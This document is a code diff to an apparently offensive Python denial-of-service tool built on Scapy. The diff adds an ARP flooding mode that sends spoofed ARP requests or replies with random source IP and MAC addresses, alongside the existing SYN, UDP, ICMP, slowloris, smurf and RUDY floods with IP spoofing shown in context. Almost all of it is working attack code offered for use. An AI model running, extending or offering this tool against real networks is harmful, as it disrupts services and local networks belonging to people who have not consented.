@@ -15,6 +15,18 @@ from source.dosinatorfiglet import dosinatorfiglet
 
 def generate_random_ip():
     return ".".join(str(random.randint(0, 255)) for _ in range(4))
+def generate_random_mac():
+    return ":".join([format(random.randint(0, 255), '02x') for _ in range(6)])
+def get_mac_address(ip_address):
+    arp = ARP(pdst=ip_address)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether / arp
+    result = srp(packet, timeout=3, verbose=False)
+    if result:
+        return result[0][0][1].hwsrc
+    else:
+        return None
+
 
 def read_data_from_file(file_path):
     try:
@@ -28,6 +40,8 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, cust
     try:
         source_ip = spoof_ip() if spoof_ip else generate_random_ip()
         source_port = RandShort()
+        source_mac = generate_random_mac()
+
 
         if custom_data:
             payload = custom_data.encode()
@@ -58,6 +72,18 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, cust
             headers = "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n".format(target_ip, packet_size)
             payload = "X-a: b\r\n"
             packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='A') / headers / payload / Raw(RandString(size=packet_size))
+        elif attack_mode == "arp":
+            target_mac = get_mac_address(target_ip)
+            if not target_mac:
+                print(f"Could not resolve MAC address for {target_ip}. ARP flooding failed.")
+                return
+            elif arp_mode == "request":
+                packet = ARP(op=1, pdst=target_ip, psrc=source_ip, hwsrc=source_mac) / payload / Raw(RandString(size=packet_size))
+            elif arp_mode == "reply":
+                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac) / payload / Raw(RandString(size=packet_size))
+            else:
+                print("Invalid ARP mode.")
+                return
         else:
             print("Invalid attack mode.")
             return
@@ -82,6 +108,7 @@ def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, du
     print(f"Duration         : {duration} seconds")
     print(f"Attack Mode      : {attack_mode}")
     print(f"Spoof IP         : {spoof_ip.__name__ if spoof_ip else 'Default'}")
+    print(f"ARP Mode         : {arp_mode if attack_mode == 'arp' else 'N/A'}")
     print()
 
     delay = 1 / attack_rate if attack_rate > 0 else 0
@@ -123,16 +150,17 @@ def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, du
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description=dosinatorfiglet())
     parser.add_argument('-t', '--target',  required=True, help='Target IP address')
-    parser.add_argument('-p', '--port', type=int, required=True, help='Target port number')
+    parser.add_argument('-p', '--port', type=int, help='Target port number (required for non-ARP attacks)')
     parser.add_argument('-np', '--num_packets', type=int, default=500, help='Number of packets to send (default: 500)')
     parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)')
     parser.add_argument('-ar', '--attack_rate', type=int, default=10, help='Attack rate in packets/second (default: 10)')
     parser.add_argument('-d ', '--duration', type=int, help='Duration of the attack in seconds')
-    parser.add_argument('-am', '--attack-mode', choices=["syn", "sctp", "udp", "icmp", "http", "dns", "os_fingerprint", "slowloris", "smurf", "rudy"], default="syn", help='Attack mode (default: syn)')
+    parser.add_argument('--attack-mode', choices=["syn", "sctp", "udp", "icmp", "http", "dns", "os_fingerprint", "slowloris", "smurf", "rudy", "arp"], default="syn", help='Attack mode (default: syn)')
     parser.add_argument('-sp', '--spoof-ip', default=None, help='Spoof IP address')
     parser.add_argument('--data', type=str, default=None, help='Custom data string to send')
     parser.add_argument('--file', type=str, default=None, help='File path to read data from')
     parser.add_argument('--pcap', type=str, default=None, help='PCAP file path to save outgoing packets')
+    parser.add_argument('--arp-mode', choices=["request", "reply"], default="request", help='ARP mode (default: request)')
 
     args = parser.parse_args()
 
@@ -146,12 +174,19 @@ if __name__ == '__main__':
     data = args.data
     file_path = args.file
     pcap_file = args.pcap
+    arp_mode = args.arp_mode
 
     if args.spoof_ip == "random":
         spoof_ip = generate_random_ip
     else:
         spoof_ip = lambda: args.spoof_ip if args.spoof_ip else None
+
     if file_path:
         data = read_data_from_file(file_path)
 
-    dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, data, pcap_file)
+    if not target_ip:
+        print("Target IP address is required.")
+    elif attack_mode != "arp" and not target_port:
+        print("Port number is required for non-ARP attacks.")
+    else:
+        dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, data, pcap_file)
